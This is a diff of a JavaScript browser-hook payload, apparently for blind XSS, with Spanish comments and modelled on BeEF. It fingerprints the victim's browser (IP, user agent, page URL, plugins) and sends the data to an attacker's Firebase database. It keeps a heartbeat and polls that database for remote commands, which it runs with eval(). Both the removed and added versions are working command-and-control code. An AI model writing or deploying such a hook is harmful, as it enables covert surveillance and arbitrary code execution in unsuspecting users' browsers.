@@ -1,64 +1,100 @@
-// Configuración
-const FIREBASE_URL = "https://bdblindxss-default-rtdb.firebaseio.com/";
-const APPS_SCRIPT_URL = "TU_URL_DE_APPS_SCRIPT";
-
-// Generar ID único
-const hookId = 'hook_' + Math.random().toString(36).substr(2, 9);
-
-// Registrar hook
-function registerHook() {
-  fetch('https://api.ipify.org?format=json')
-    .then(r => r.json())
-    .then(({ip}) => {
-      const hookData = {
-        id: hookId,
-        ip: ip,
-        userAgent: navigator.userAgent,
-        url: window.location.href,
-        firstSeen: new Date().toISOString(),
-        lastActive: new Date().toISOString()
-      };
-      
-      // Enviar a Firebase directamente
-      fetch(`${FIREBASE_URL}/beef_hooks/${hookId}.json`, {
-        method: 'PUT',
-        body: JSON.stringify(hookData)
-      });
-      
-      // Enviar también a Apps Script como backup
-      fetch(`${APPS_SCRIPT_URL}?key=TU_CLAVE_SECRETA&hookData=${encodeURIComponent(JSON.stringify(hookData))}`);
-    });
-}
-
-// Heartbeat cada 30 segundos
-setInterval(() => {
-  const update = { lastActive: new Date().toISOString() };
-  fetch(`${FIREBASE_URL}/beef_hooks/${hookId}/lastActive.json`, {
-    method: 'PUT',
-    body: JSON.stringify(update.lastActive)
-  });
-}, 30000);
-
-// Escuchar comandos
-function listenCommands() {
-  const commandRef = firebase.database().ref(`beef_commands`).orderByChild('hookId').equalTo(hookId);
-  commandRef.on('child_added', (snapshot) => {
-    const cmd = snapshot.val();
-    if (cmd.status === 'pending') {
-      try {
-        eval(cmd.instruction);
-        // Marcar como ejecutado
-        snapshot.ref.update({ status: 'executed' });
-      } catch (e) {
-        snapshot.ref.update({ status: 'failed', error: e.message });
-      }
-    }
-  });
-}
+// Configuración Firebase (usa tu URL)
+const FIREBASE_CONFIG = {
+  databaseURL: "https://bdblindxss-default-rtdb.firebaseio.com"
+};
 
 // Inicialización
-if (!localStorage.getItem('beef_hook')) {
-  localStorage.setItem('beef_hook', hookId);
-  registerHook();
+const hookId = 'hook_' + Math.random().toString(36).substr(2, 9);
+let isActive = true;
+
+// Función principal
+(async function() {
+  // Persistencia en localStorage
+  if (!localStorage.getItem('beef_hook')) {
+    localStorage.setItem('beef_hook', hookId);
+  } else {
+    hookId = localStorage.getItem('beef_hook');
+  }
+
+  // Registrar hook
+  await registerHook();
+
+  // Heartbeat cada 25 segundos
+  setInterval(sendHeartbeat, 25000);
+
+  // Escuchar comandos
   listenCommands();
+})();
+
+// Funciones auxiliares
+async function registerHook() {
+  const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(data => data.ip);
+  
+  const hookData = {
+    id: hookId,
+    ip: ip,
+    userAgent: navigator.userAgent,
+    url: window.location.href,
+    plugins: Array.from(navigator.plugins).map(p => p.name),
+    firstSeen: new Date().toISOString(),
+    lastActive: new Date().toISOString(),
+    status: "active"
+  };
+
+  // Enviar a Firebase
+  fetch(`${FIREBASE_CONFIG.databaseURL}/beef_hooks/${hookId}.json`, {
+    method: 'PUT',
+    body: JSON.stringify(hookData)
+  });
+}
+
+function sendHeartbeat() {
+  if (!isActive) return;
+  
+  const update = { 
+    lastActive: new Date().toISOString(),
+    status: "active"
+  };
+  
+  fetch(`${FIREBASE_CONFIG.databaseURL}/beef_hooks/${hookId}.json`, {
+    method: 'PATCH',
+    body: JSON.stringify(update)
+  });
+}
+
+function listenCommands() {
+  const eventSource = new EventSource(`${FIREBASE_CONFIG.databaseURL}/beef_commands.json?orderBy="hookId"&equalTo="${hookId}"`);
+
+  eventSource.onmessage = (e) => {
+    const data = JSON.parse(e.data);
+    if (data && data.instruction) {
+      try {
+        eval(data.instruction);
+        logCommand(data, "executed");
+      } catch (err) {
+        logCommand(data, "failed", err.message);
+      }
+    }
+  };
+}
+
+function logCommand(cmd, status, error = null) {
+  const logData = {
+    ...cmd,
+    status: status,
+    executedAt: new Date().toISOString(),
+    error: error
+  };
+  
+  fetch(`${FIREBASE_CONFIG.databaseURL}/command_logs.json`, {
+    method: 'POST',
+    body: JSON.stringify(logData)
+  });
+}
+
+// Autodestrucción después de fecha límite
+const EXPIRATION_DATE = new Date('2024-12-31');
+if (new Date() > EXPIRATION_DATE) {
+  isActive = false;
+  localStorage.removeItem('beef_hook');
 }
